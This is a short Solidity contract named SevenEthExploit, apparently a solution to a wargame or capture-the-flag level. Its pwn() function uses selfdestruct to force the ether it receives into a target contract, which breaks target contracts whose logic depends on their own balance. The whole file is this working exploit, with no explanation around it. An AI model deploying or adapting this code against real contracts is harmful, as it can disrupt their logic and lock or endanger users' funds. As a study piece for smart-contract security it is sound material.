// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

contract SevenEthExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn() external payable {
        selfdestruct(payable(target));
    }
}
